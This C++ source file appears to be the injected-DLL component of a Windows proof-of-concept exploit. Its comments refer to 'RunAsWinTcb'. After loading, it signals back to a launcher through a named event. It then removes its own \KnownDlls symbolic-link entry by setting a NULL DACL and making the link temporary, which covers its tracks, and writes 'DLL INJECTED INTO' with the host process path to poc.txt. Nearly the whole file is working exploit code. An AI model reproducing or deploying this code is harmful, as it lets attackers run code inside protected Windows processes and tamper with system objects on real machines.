#include "dllexploit.h"
#include <stdio.h>
#include <fstream>
using namespace std;

void ExploitMain() {
    LPWSTR pwszCommandLine = GetCommandLine();
    LPWSTR* argv = NULL;
    LPWSTR g_pwszGuid = NULL;
    HANDLE hEvent = NULL;
    int argc = 0;
    int i = 0;
    WCHAR wszEventName[MAX_PATH] = { 0 };
    argv = CommandLineToArgvW(pwszCommandLine, &argc);
    g_pwszGuid = argv[1];

    //Signaling RunAsWinTcb back
    StringCchPrintf(wszEventName, MAX_PATH, L"Global\\%ws_DLL_LOADED", g_pwszGuid);
    if (hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, wszEventName))
    {
        if (!SetEvent(hEvent)) {
        }

        CloseHandle(hEvent);
    }
    CleanUp();
    WriteSelfName(L"poc.txt");
}

void WriteSelfName(LPCWSTR filename) {
    ofstream myfile;
    myfile.open(filename);
    char result_text[128];
    wchar_t fullPath[MAX_PATH]{ 0 };
    DWORD name = GetModuleFileName(NULL, fullPath, MAX_PATH);
    _bstr_t b(fullPath);
    const char* c = b;
    sprintf_s(result_text, "DLL INJECTED INTO %s", c);
    myfile << result_text;
    myfile.close();
}

void CleanUp() {
    LPWSTR pwszDllName = NULL;
    GetCurrentDllFileName(&pwszDllName);
    DeleteKnownDllEntry(pwszDllName);
}

BOOL GetCurrentDllFileName(LPWSTR* ppwszDllName)
{
    WCHAR wszDllPath[MAX_PATH];
    LPWSTR pwszDllName = NULL;

    GetModuleFileName(g_hInstance, wszDllPath, MAX_PATH);
    if (GetLastError() == ERROR_SUCCESS)
    {
        pwszDllName = PathFindFileName(wszDllPath);
        *ppwszDllName = (LPWSTR)LocalAlloc(LPTR, 64 * sizeof(WCHAR));
        if (*ppwszDllName)
        {
            StringCchPrintf(*ppwszDllName, 64, L"%ws", pwszDllName);
            return TRUE;
        }
    }

    return FALSE;
}

void DeleteKnownDllEntry(LPCWSTR pwszDllName)
{

    NTSTATUS status = 0;
    HANDLE hLink = NULL;
    LPWSTR pwszLinkPath = NULL;
    UNICODE_STRING name = { 0 };
    OBJECT_ATTRIBUTES oa = { 0 };

    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_ATTRIBUTES sa = { 0 };

    pwszLinkPath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszLinkPath)
        return;

    StringCchPrintf(pwszLinkPath, MAX_PATH, L"\\KnownDlls\\%ws", pwszDllName);

    RtlInitUnicodeString(&name, pwszLinkPath);
    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

    status = NtOpenSymbolicLinkObject(&hLink, WRITE_DAC, &oa);
    SetLastError(RtlNtStatusToDosError(status));
    if (status != 0)
    {
        return;
    }

    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
#pragma warning( suppress : 6248 )
    if (!SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE))
    {
        return;
    }

    sa.nLength = sizeof(sa);
    sa.bInheritHandle = FALSE;
    sa.lpSecurityDescriptor = &sd;

    if (!SetKernelObjectSecurity(hLink, DACL_SECURITY_INFORMATION, &sd))
    {
        return;
    }

    status = NtClose(hLink);
    SetLastError(RtlNtStatusToDosError(status));
    if (status != 0)
    {
        return;
    }

    status = NtOpenSymbolicLinkObject(&hLink, DELETE, &oa);
    SetLastError(RtlNtStatusToDosError(status));
    if (status != 0)
    {
        return;
    }


    status = NtMakeTemporaryObject(hLink);
    SetLastError(RtlNtStatusToDosError(status));
    if (status != 0)
    {
        return;
    }

    if (hLink)
        NtClose(hLink);
    if (pwszLinkPath)
        LocalFree(pwszLinkPath);
}